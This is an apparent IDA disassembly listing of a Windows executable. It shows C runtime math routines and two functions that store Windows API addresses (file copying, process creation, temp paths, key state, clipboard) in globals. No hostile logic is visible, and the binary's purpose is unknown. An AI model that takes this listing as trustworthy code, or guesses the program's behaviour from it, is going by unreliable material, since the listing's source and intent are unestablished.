loc_41FE45:				; CODE XREF: sub_41FDFC+53j
		cmp	[ebp+eax*4+var_20], ebx
		jnz	short loc_41FE58
		inc	eax
		cmp	eax, 3
		jl	short loc_41FE45
		xor	eax, eax
		jmp	loc_4202FD
; ---------------------------------------------------------------------------

loc_41FE58:				; CODE XREF: sub_41FDFC+4Dj
		xor	eax, eax
		lea	edi, [ebp+var_20]
		stosd
		stosd
		push	2
		stosd
		pop	eax
		jmp	loc_4202FD
; ---------------------------------------------------------------------------

loc_41FE68:				; CODE XREF: sub_41FDFC+43j
		and	[ebp+arg_0], 0
		push	esi
		lea	esi, [ebp+var_20]
		lea	edi, [ebp+var_2C]
		movsd
		movsd
		movsd
		mov	esi, dword_430C80
		dec	esi
		lea	ecx, [esi+1]
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		sar	eax, 5
		mov	edx, ecx
		and	edx, 8000001Fh
		mov	[ebp+var_10], ebx
		mov	[ebp+var_C], eax
		jns	short loc_41FEA0
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FEA0:				; CODE XREF: sub_41FDFC+9Dj
		lea	edi, [ebp+eax*4+var_20]
		push	1Fh
		xor	eax, eax
		pop	ecx
		sub	ecx, edx
		inc	eax
		shl	eax, cl
		mov	[ebp+var_8], ecx
		test	[edi], eax
		jz	loc_41FF46
		mov	eax, [ebp+var_C]
		or	edx, 0FFFFFFFFh
		shl	edx, cl
		not	edx
		test	[ebp+eax*4+var_20], edx
		jmp	short loc_41FECE
; ---------------------------------------------------------------------------

loc_41FEC9:				; CODE XREF: sub_41FDFC+D8j
		cmp	[ebp+eax*4+var_20], 0

loc_41FECE:				; CODE XREF: sub_41FDFC+CBj
		jnz	short loc_41FED8
		inc	eax
		cmp	eax, 3
		jl	short loc_41FEC9
		jmp	short loc_41FF46
; ---------------------------------------------------------------------------

loc_41FED8:				; CODE XREF: sub_41FDFC:loc_41FECEj
		mov	eax, esi
		cdq
		push	1Fh
		pop	ecx
		and	edx, ecx
		add	eax, edx
		sar	eax, 5
		and	esi, 8000001Fh
		jns	short loc_41FEF2
		dec	esi
		or	esi, 0FFFFFFE0h
		inc	esi

loc_41FEF2:				; CODE XREF: sub_41FDFC+EFj
		and	[ebp+var_4], 0
		sub	ecx, esi
		xor	edx, edx
		inc	edx
		shl	edx, cl
		lea	ecx, [ebp+eax*4+var_20]
		mov	esi, [ecx]
		add	esi, edx
		mov	[ebp+arg_0], esi
		mov	esi, [ecx]
		cmp	[ebp+arg_0], esi
		jb	short loc_41FF31
		cmp	[ebp+arg_0], edx
		jmp	short loc_41FF2F
; ---------------------------------------------------------------------------

loc_41FF14:				; CODE XREF: sub_41FDFC+145j
		test	ecx, ecx
		jz	short loc_41FF43
		and	[ebp+var_4], 0
		lea	ecx, [ebp+eax*4+var_20]
		mov	edx, [ecx]
		lea	esi, [edx+1]
		mov	[ebp+arg_0], esi
		cmp	esi, edx
		jb	short loc_41FF31
		cmp	esi, 1

loc_41FF2F:				; CODE XREF: sub_41FDFC+116j
		jnb	short loc_41FF38

loc_41FF31:				; CODE XREF: sub_41FDFC+111j
					; sub_41FDFC+12Ej
		mov	[ebp+var_4], 1

loc_41FF38:				; CODE XREF: sub_41FDFC:loc_41FF2Fj
		dec	eax
		mov	edx, [ebp+arg_0]
		mov	[ecx], edx
		mov	ecx, [ebp+var_4]
		jns	short loc_41FF14

loc_41FF43:				; CODE XREF: sub_41FDFC+11Aj
		mov	[ebp+arg_0], ecx

loc_41FF46:				; CODE XREF: sub_41FDFC+B7j
					; sub_41FDFC+DAj
		mov	ecx, [ebp+var_8]
		or	eax, 0FFFFFFFFh
		shl	eax, cl
		and	[edi], eax
		mov	eax, [ebp+var_C]
		inc	eax
		cmp	eax, 3
		jge	short loc_41FF66
		push	3
		pop	ecx
		lea	edi, [ebp+eax*4+var_20]
		sub	ecx, eax
		xor	eax, eax
		rep stosd

loc_41FF66:				; CODE XREF: sub_41FDFC+15Bj
		cmp	[ebp+arg_0], 0
		jz	short loc_41FF6D
		inc	ebx

loc_41FF6D:				; CODE XREF: sub_41FDFC+16Ej
		mov	eax, dword_430C7C
		mov	ecx, eax
		sub	ecx, dword_430C80
		cmp	ebx, ecx
		jge	short loc_41FF8B
		xor	eax, eax
		lea	edi, [ebp+var_20]
		stosd
		stosd
		stosd
		jmp	loc_420198
; ---------------------------------------------------------------------------

loc_41FF8B:				; CODE XREF: sub_41FDFC+180j
		cmp	ebx, eax
		jg	loc_4201A2
		sub	eax, [ebp+var_10]
		lea	esi, [ebp+var_2C]
		mov	ecx, eax
		lea	edi, [ebp+var_20]
		movsd
		cdq
		and	edx, 1Fh
		add	eax, edx
		movsd
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		movsd
		jns	short loc_41FFB9
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FFB9:				; CODE XREF: sub_41FDFC+1B6j
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	edi, 0FFFFFFFFh
		mov	ecx, edx
		shl	edi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	edi

loc_41FFD4:				; CODE XREF: sub_41FDFC+203j
		mov	ebx, [ebp+arg_0]
		lea	ebx, [ebp+ebx*4+var_20]
		mov	esi, [ebx]
		mov	ecx, esi
		and	ecx, edi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	esi, cl
		mov	ecx, [ebp+var_4]
		or	esi, [ebp+var_C]
		mov	[ebx], esi
		mov	esi, [ebp+var_10]
		shl	esi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], esi
		jl	short loc_41FFD4
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_42000E:				; CODE XREF: sub_41FDFC+229j
		cmp	edx, eax
		jl	short loc_42001A
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_42001F
; ---------------------------------------------------------------------------

loc_42001A:				; CODE XREF: sub_41FDFC+214j
		and	[ebp+edx*4+var_20], 0

loc_42001F:				; CODE XREF: sub_41FDFC+21Cj
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_42000E
		mov	esi, dword_430C80
		dec	esi
		lea	ecx, [esi+1]
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		sar	eax, 5
		mov	edx, ecx
		and	edx, 8000001Fh
		mov	[ebp+var_C], eax
		jns	short loc_42004E
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_42004E:				; CODE XREF: sub_41FDFC+24Bj
		push	1Fh
		pop	ecx
		sub	ecx, edx
		xor	edx, edx
		inc	edx
		shl	edx, cl
		lea	ebx, [ebp+eax*4+var_20]
		mov	[ebp+var_10], ecx
		test	[ebx], edx
		jz	loc_4200E9
		or	edx, 0FFFFFFFFh
		shl	edx, cl
		not	edx
		test	[ebp+eax*4+var_20], edx
		jmp	short loc_420079
; ---------------------------------------------------------------------------

loc_420074:				; CODE XREF: sub_41FDFC+283j
		cmp	[ebp+eax*4+var_20], 0

loc_420079:				; CODE XREF: sub_41FDFC+276j
		jnz	short loc_420083
		inc	eax
		cmp	eax, 3
		jl	short loc_420074
		jmp	short loc_4200E9
; ---------------------------------------------------------------------------

loc_420083:				; CODE XREF: sub_41FDFC:loc_420079j
		mov	eax, esi
		cdq
		push	1Fh
		pop	ecx
		and	edx, ecx
		add	eax, edx
		sar	eax, 5
		and	esi, 8000001Fh
		jns	short loc_42009D
		dec	esi
		or	esi, 0FFFFFFE0h
		inc	esi

loc_42009D:				; CODE XREF: sub_41FDFC+29Aj
		and	[ebp+arg_0], 0
		xor	edx, edx
		sub	ecx, esi
		inc	edx
		shl	edx, cl
		lea	ecx, [ebp+eax*4+var_20]
		mov	esi, [ecx]
		lea	edi, [esi+edx]
		cmp	edi, esi
		jb	short loc_4200B9
		cmp	edi, edx
		jnb	short loc_4200C0

loc_4200B9:				; CODE XREF: sub_41FDFC+2B7j
		mov	[ebp+arg_0], 1

loc_4200C0:				; CODE XREF: sub_41FDFC+2BBj
		mov	[ecx], edi
		mov	ecx, [ebp+arg_0]
		jmp	short loc_4200E6
; ---------------------------------------------------------------------------

loc_4200C7:				; CODE XREF: sub_41FDFC+2EBj
		test	ecx, ecx
		jz	short loc_4200E9
		lea	ecx, [ebp+eax*4+var_20]
		mov	edx, [ecx]
		lea	esi, [edx+1]
		xor	edi, edi
		cmp	esi, edx
		jb	short loc_4200DF
		cmp	esi, 1
		jnb	short loc_4200E2

loc_4200DF:				; CODE XREF: sub_41FDFC+2DCj
		xor	edi, edi
		inc	edi

loc_4200E2:				; CODE XREF: sub_41FDFC+2E1j
		mov	[ecx], esi
		mov	ecx, edi

loc_4200E6:				; CODE XREF: sub_41FDFC+2C9j
		dec	eax
		jns	short loc_4200C7

loc_4200E9:				; CODE XREF: sub_41FDFC+265j
					; sub_41FDFC+285j ...
		mov	ecx, [ebp+var_10]
		or	eax, 0FFFFFFFFh
		shl	eax, cl
		and	[ebx], eax
		mov	eax, [ebp+var_C]
		inc	eax
		cmp	eax, 3
		jge	short loc_420109
		push	3
		pop	ecx
		lea	edi, [ebp+eax*4+var_20]
		sub	ecx, eax
		xor	eax, eax
		rep stosd

loc_420109:				; CODE XREF: sub_41FDFC+2FEj
		mov	ecx, dword_430C84
		inc	ecx
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		jns	short loc_42012A
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_42012A:				; CODE XREF: sub_41FDFC+327j
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	edi, 0FFFFFFFFh
		mov	ecx, edx
		shl	edi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	edi

loc_420145:				; CODE XREF: sub_41FDFC+374j
		mov	ebx, [ebp+arg_0]
		lea	ebx, [ebp+ebx*4+var_20]
		mov	esi, [ebx]
		mov	ecx, esi
		and	ecx, edi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	esi, cl
		mov	ecx, [ebp+var_4]
		or	esi, [ebp+var_C]
		mov	[ebx], esi
		mov	esi, [ebp+var_10]
		shl	esi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], esi
		jl	short loc_420145
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_42017F:				; CODE XREF: sub_41FDFC+39Aj
		cmp	edx, eax
		jl	short loc_42018B
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_420190
; ---------------------------------------------------------------------------

loc_42018B:				; CODE XREF: sub_41FDFC+385j
		and	[ebp+edx*4+var_20], 0

loc_420190:				; CODE XREF: sub_41FDFC+38Dj
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_42017F

loc_420198:				; CODE XREF: sub_41FDFC+18Aj
		push	2
		xor	ebx, ebx
		pop	eax
		jmp	loc_4202FC
; ---------------------------------------------------------------------------

loc_4201A2:				; CODE XREF: sub_41FDFC+191j
		cmp	ebx, dword_430C78
		mov	ecx, dword_430C84
		jl	loc_420261
		xor	eax, eax
		lea	edi, [ebp+var_20]
		stosd
		stosd
		stosd
		or	[ebp+var_20], 80000000h
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		jns	short loc_4201DD
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_4201DD:				; CODE XREF: sub_41FDFC+3DAj
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	edi, 0FFFFFFFFh
		mov	ecx, edx
		shl	edi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	edi

loc_4201F8:				; CODE XREF: sub_41FDFC+427j
		mov	ebx, [ebp+arg_0]
		lea	ebx, [ebp+ebx*4+var_20]
		mov	esi, [ebx]
		mov	ecx, esi
		and	ecx, edi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	esi, cl
		mov	ecx, [ebp+var_4]
		or	esi, [ebp+var_C]
		mov	[ebx], esi
		mov	esi, [ebp+var_10]
		shl	esi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], esi
		jl	short loc_4201F8
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_420232:				; CODE XREF: sub_41FDFC+44Dj
		cmp	edx, eax
		jl	short loc_42023E
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_420243
; ---------------------------------------------------------------------------

loc_42023E:				; CODE XREF: sub_41FDFC+438j
		and	[ebp+edx*4+var_20], 0

loc_420243:				; CODE XREF: sub_41FDFC+440j
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_420232
		mov	eax, dword_430C78
		mov	ecx, dword_430C8C
		lea	ebx, [ecx+eax]
		xor	eax, eax
		inc	eax
		jmp	loc_4202FC
; ---------------------------------------------------------------------------

loc_420261:				; CODE XREF: sub_41FDFC+3B2j
		mov	eax, dword_430C8C
		and	[ebp+var_20], 7FFFFFFFh
		add	ebx, eax
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		jns	short loc_420289
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_420289:				; CODE XREF: sub_41FDFC+486j
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	esi, 0FFFFFFFFh
		mov	ecx, edx
		shl	esi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	esi

loc_4202A4:				; CODE XREF: sub_41FDFC+4D6j
		mov	ecx, [ebp+arg_0]
		mov	edi, [ebp+ecx*4+var_20]
		mov	ecx, edi
		and	ecx, esi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	edi, cl
		mov	ecx, [ebp+arg_0]
		or	edi, [ebp+var_C]
		mov	[ebp+ecx*4+var_20], edi
		mov	edi, [ebp+var_10]
		mov	ecx, [ebp+var_4]
		shl	edi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], edi
		jl	short loc_4202A4
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_4202E1:				; CODE XREF: sub_41FDFC+4FCj
		cmp	edx, eax
		jl	short loc_4202ED
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_4202F2
; ---------------------------------------------------------------------------

loc_4202ED:				; CODE XREF: sub_41FDFC+4E7j
		and	[ebp+edx*4+var_20], 0

loc_4202F2:				; CODE XREF: sub_41FDFC+4EFj
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_4202E1
		xor	eax, eax

loc_4202FC:				; CODE XREF: sub_41FDFC+3A1j
					; sub_41FDFC+460j
		pop	esi

loc_4202FD:				; CODE XREF: sub_41FDFC+57j
					; sub_41FDFC+67j
		push	1Fh
		pop	ecx
		sub	ecx, dword_430C84
		shl	ebx, cl
		mov	ecx, [ebp+var_14]
		neg	ecx
		sbb	ecx, ecx
		and	ecx, 80000000h
		or	ebx, ecx
		mov	ecx, dword_430C88
		or	ebx, [ebp+var_20]
		cmp	ecx, 40h
		jnz	short loc_420332
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+var_1C]
		mov	[ecx+4], ebx
		mov	[ecx], edx
		jmp	short loc_42033C
; ---------------------------------------------------------------------------

loc_420332:				; CODE XREF: sub_41FDFC+527j
		cmp	ecx, 20h
		jnz	short loc_42033C
		mov	ecx, [ebp+arg_4]
		mov	[ecx], ebx

loc_42033C:				; CODE XREF: sub_41FDFC+534j
					; sub_41FDFC+539j
		pop	edi
		pop	ebx
		leave
		retn
sub_41FDFC	endp

; [000006C7 BYTES: COLLAPSED FUNCTION ___strgtold12_l. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 4
off_420A08	dd offset loc_4203DA	; DATA XREF: ___strgtold12_l+93r
		dd offset loc_42042E	; jump table for switch	statement
		dd offset loc_420484
		dd offset loc_4204B7
		dd offset loc_4204FC
		dd offset loc_420534
		dd offset loc_420548
		dd offset loc_4205A3
		dd offset loc_42058E
		dd offset loc_42060D
		dd offset loc_420602
		dd offset loc_4205B1
; [00000924 BYTES: COLLAPSED FUNCTION _$I10_OUTPUT. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000106 BYTES: COLLAPSED FUNCTION ___report_gsfailure. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000057 BYTES: COLLAPSED FUNCTION _fastzero_I. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000008F BYTES: COLLAPSED FUNCTION __VEC_memzero. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000008E BYTES: COLLAPSED FUNCTION __hw_cw. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [000000A0 BYTES: COLLAPSED FUNCTION ___hw_cw_sse2. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000030F BYTES: COLLAPSED FUNCTION __control87. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000116 BYTES: COLLAPSED FUNCTION __calloc_impl. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000008 BYTES: COLLAPSED CHUNK OF FUNCTION __calloc_impl. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 4
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000045 BYTES: COLLAPSED FUNCTION __unwind_handler.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000084 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__NLG_Notify1:
		push	ebx
		push	ecx
		mov	ebx, offset dword_430C90
		jmp	short __NLG_Go
; [0000001F BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000003 BYTES: COLLAPSED FUNCTION __NLG_Call. PRESS	KEYPAD CTRL-"+"	TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_421BDB	proc near		; CODE XREF: __87except+11Ap
					; DATA XREF: ___libm_error_support:loc_41D400o
		xor	eax, eax
		retn
sub_421BDB	endp

; [000002DC BYTES: COLLAPSED FUNCTION __raise_exc_ex. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __raise_exc. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [000001E2 BYTES: COLLAPSED FUNCTION __handle_exc. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION __set_errno_from_matherr.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000010 BYTES: COLLAPSED FUNCTION __statfp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __clrfp. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION __ctrlfp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __set_statfp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000072 BYTES: COLLAPSED FUNCTION ___set_fpsr_sse2.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000116 BYTES: COLLAPSED FUNCTION _abort. PRESS KEYPAD CTRL-"+" TO EXPAND]
		db 0CCh
; [000000A3 BYTES: COLLAPSED FUNCTION __msize. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000049 BYTES: COLLAPSED FUNCTION ___ansicp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION ___convertcp. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000016 BYTES: COLLAPSED FUNCTION __alloca_probe_16. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION __alloca_probe_8.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION _atol. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001CE BYTES: COLLAPSED FUNCTION ___mtold12. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000022F BYTES: COLLAPSED FUNCTION strtoxl(localeinfo_struct	*,char const *,char const * *,int,int).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strtol. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000061 BYTES: COLLAPSED FUNCTION ___ascii_strnicmp. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h

__aulldvrm:
		push	esi
		mov	eax, [esp+14h]
		or	eax, eax
		jnz	short loc_422AD1
		mov	ecx, [esp+10h]
		mov	eax, [esp+0Ch]
		xor	edx, edx
		div	ecx
		mov	ebx, eax
		mov	eax, [esp+8]
		div	ecx
		mov	esi, eax
		mov	eax, ebx
		mul	dword ptr [esp+10h]
		mov	ecx, eax
		mov	eax, esi
		mul	dword ptr [esp+10h]
		add	edx, ecx
		jmp	short loc_422B18
; ---------------------------------------------------------------------------

loc_422AD1:				; CODE XREF: .text:00422AA7j
		mov	ecx, eax
		mov	ebx, [esp+10h]
		mov	edx, [esp+0Ch]
		mov	eax, [esp+8]

loc_422ADF:				; CODE XREF: .text:00422AE9j
		shr	ecx, 1
		rcr	ebx, 1
		shr	edx, 1
		rcr	eax, 1
		or	ecx, ecx
		jnz	short loc_422ADF
		div	ebx
		mov	esi, eax
		mul	dword ptr [esp+14h]
		mov	ecx, eax
		mov	eax, [esp+10h]
		mul	esi
		add	edx, ecx
		jb	short loc_422B0D
		cmp	edx, [esp+0Ch]
		ja	short loc_422B0D
		jb	short loc_422B16
		cmp	eax, [esp+8]
		jbe	short loc_422B16

loc_422B0D:				; CODE XREF: .text:00422AFDj
					; .text:00422B03j
		dec	esi
		sub	eax, [esp+10h]
		sbb	edx, [esp+14h]

loc_422B16:				; CODE XREF: .text:00422B05j
					; .text:00422B0Bj
		xor	ebx, ebx

loc_422B18:				; CODE XREF: .text:00422ACFj
		sub	eax, [esp+8]
		sbb	edx, [esp+0Ch]
		neg	edx
		neg	eax
		sbb	edx, 0
		mov	ecx, edx
		mov	edx, ebx
		mov	ebx, ecx
		mov	ecx, eax
		mov	eax, esi
		pop	esi
		retn	10h
; ---------------------------------------------------------------------------
		align 10h

__allmul:
		mov	eax, [esp+8]
		mov	ecx, [esp+10h]
		or	ecx, eax
		mov	ecx, [esp+0Ch]
		jnz	short hard
		mov	eax, [esp+4]
		mul	ecx
		retn	10h
; ---------------------------------------------------------------------------

hard:					; CODE XREF: .text:00422B4Ej
		push	ebx
		mul	ecx
		mov	ebx, eax
		mov	eax, [esp+8]
		mul	dword ptr [esp+14h]
		add	ebx, eax
		mov	eax, [esp+8]
		mul	ecx
		add	edx, ebx
		pop	ebx
		retn	10h
; ---------------------------------------------------------------------------
		align 10h
; [00000005 BYTES: COLLAPSED CHUNK OF FUNCTION _strchr.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [000000BE BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_422C60	proc near		; DATA XREF: .rdata:004243ECo
		push	ebp
		mov	ebp, esp
		mov	eax, ds:GetModuleFileNameW
		mov	dword_44E458, eax
		mov	ecx, ds:GetCurrentProcess
		mov	dword_44E45C, ecx
		mov	edx, ds:CopyFileW
		mov	dword_44E460, edx
		mov	eax, ds:ExitProcess
		mov	dword_44E464, eax
		mov	ecx, ds:GetWindowsDirectoryW
		mov	dword_44E468, ecx
		mov	edx, ds:GetTempPathW
		mov	dword_44E46C, edx
		mov	eax, ds:GetCommandLineW
		mov	dword_44E470, eax
		mov	ecx, ds:SetErrorMode
		mov	dword_44E474, ecx
		mov	edx, ds:CloseHandle
		mov	dword_44E478, edx
		mov	eax, ds:lstrlenW
		mov	dword_44E47C, eax
		mov	ecx, ds:lstrcpynW
		mov	dword_44E480, ecx
		mov	edx, ds:GetDiskFreeSpaceW
		mov	dword_44E484, edx
		mov	eax, ds:GlobalUnlock
		mov	dword_44E488, eax
		mov	ecx, ds:GlobalLock
		mov	dword_44E48C, ecx
		mov	edx, ds:CreateThread
		mov	dword_44E490, edx
		mov	eax, ds:LoadLibraryW
		mov	dword_44E494, eax
		mov	ecx, ds:CreateProcessW
		mov	dword_44E498, ecx
		mov	edx, ds:lstrcmpiA
		mov	dword_44E49C, edx
		mov	eax, ds:GetTempFileNameW
		mov	dword_44E4A0, eax
		mov	ecx, ds:lstrcatW
		mov	dword_44E4A4, ecx
		mov	edx, ds:GetProcAddress
		mov	dword_44E4A8, edx
		mov	eax, ds:LoadLibraryA
		mov	dword_44E4AC, eax
		mov	ecx, ds:GetModuleHandleA
		mov	dword_44E4B0, ecx
		mov	edx, ds:OpenProcess
		mov	dword_44E4B4, edx
		mov	eax, ds:lstrcpyW
		mov	dword_44E4B8, eax
		mov	ecx, ds:GetVersionExW
		mov	dword_44E4BC, ecx
		mov	edx, ds:GetSystemDirectoryW
		mov	dword_44E4C0, edx
		mov	eax, ds:GetVersion
		mov	dword_44E4C4, eax
		mov	ecx, ds:lstrcpyA
		mov	dword_44E4C8, ecx
		mov	edx, ds:RemoveDirectoryW
		mov	dword_44E4CC, edx
		mov	eax, ds:lstrcmpA
		mov	dword_44E4D0, eax
		mov	ecx, ds:lstrcmpiW
		mov	dword_44E4D4, ecx
		mov	edx, ds:lstrcmpW
		mov	dword_44E4D8, edx
		mov	eax, ds:ExpandEnvironmentStringsW
		mov	dword_44E4DC, eax
		mov	ecx, ds:GlobalAlloc
		mov	dword_44E4E0, ecx
		mov	edx, ds:WaitForSingleObject
		mov	dword_44E4E4, edx
		mov	eax, ds:GetExitCodeProcess
		mov	dword_44E4E8, eax
		mov	ecx, ds:GlobalFree
		mov	dword_44E4EC, ecx
		mov	edx, ds:GetModuleHandleW
		mov	dword_44E4F0, edx
		mov	eax, ds:LoadLibraryExW
		mov	dword_44E4F4, eax
		mov	ecx, ds:FreeLibrary
		mov	dword_44E4F8, ecx
		mov	edx, ds:WritePrivateProfileStringW
		mov	dword_44E4FC, edx
		mov	eax, ds:GetPrivateProfileStringW
		mov	dword_44E500, eax
		mov	ecx, ds:WideCharToMultiByte
		mov	dword_44E504, ecx
		mov	edx, ds:lstrlenA
		mov	dword_44E508, edx
		mov	eax, ds:MulDiv
		mov	dword_44E50C, eax
		mov	ecx, ds:WriteFile
		mov	dword_44E510, ecx
		mov	edx, ds:ReadFile
		mov	dword_44E514, edx
		mov	eax, ds:MultiByteToWideChar
		mov	dword_44E518, eax
		mov	ecx, ds:SetFilePointer
		mov	dword_44E51C, ecx
		mov	edx, ds:FindClose
		mov	dword_44E520, edx
		mov	eax, ds:FindNextFileW
		mov	dword_44E524, eax
		mov	ecx, ds:FindFirstFileW
		mov	dword_44E528, ecx
		mov	edx, ds:DeleteFileW
		mov	dword_44E52C, edx
		mov	eax, ds:lstrcpynA
		mov	dword_44E530, eax
		pop	ebp
		retn
sub_422C60	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_422EE0	proc near		; DATA XREF: .rdata:004243F0o
		push	ebp
		mov	ebp, esp
		mov	eax, ds:GetAsyncKeyState
		mov	dword_44E1E8, eax
		mov	ecx, ds:IsDlgButtonChecked
		mov	dword_44E1EC, ecx
		mov	edx, ds:ScreenToClient
		mov	dword_44E1F0, edx
		mov	eax, ds:GetMessagePos
		mov	dword_44E1F4, eax
		mov	ecx, ds:CallWindowProcW
		mov	dword_44E1F8, ecx
		mov	edx, ds:IsWindowVisible
		mov	dword_44E1FC, edx
		mov	eax, ds:LoadBitmapW
		mov	dword_44E200, eax
		mov	ecx, ds:CloseClipboard
		mov	dword_44E204, ecx
		mov	edx, ds:SetClipboardData
		mov	dword_44E208, edx
		mov	eax, ds:EmptyClipboard
		mov	dword_44E20C, eax
		mov	ecx, ds:OpenClipboard
		mov	dword_44E210, ecx
		mov	edx, ds:TrackPopupMenu
		mov	dword_44E214, edx
		mov	eax, ds:GetWindowRect
		mov	dword_44E218, eax
		mov	ecx, ds:AppendMenuW
		mov	dword_44E21C, ecx
		mov	edx, ds:CreatePopupMenu
		mov	dword_44E220, edx
		mov	eax, ds:GetSystemMetrics
		mov	dword_44E224, eax
		mov	ecx, ds:EndDialog
		mov	dword_44E228, ecx
		mov	edx, ds:EnableMenuItem
		mov	dword_44E22C, edx
		mov	eax, ds:GetSystemMenu
		mov	dword_44E230, eax
		mov	ecx, ds:SetClassLongW
		mov	dword_44E234, ecx
		mov	edx, ds:IsWindowEnabled
		mov	dword_44E238, edx
		mov	eax, ds:SetWindowPos
		mov	dword_44E23C, eax
		mov	ecx, ds:DialogBoxParamW
		mov	dword_44E240, ecx
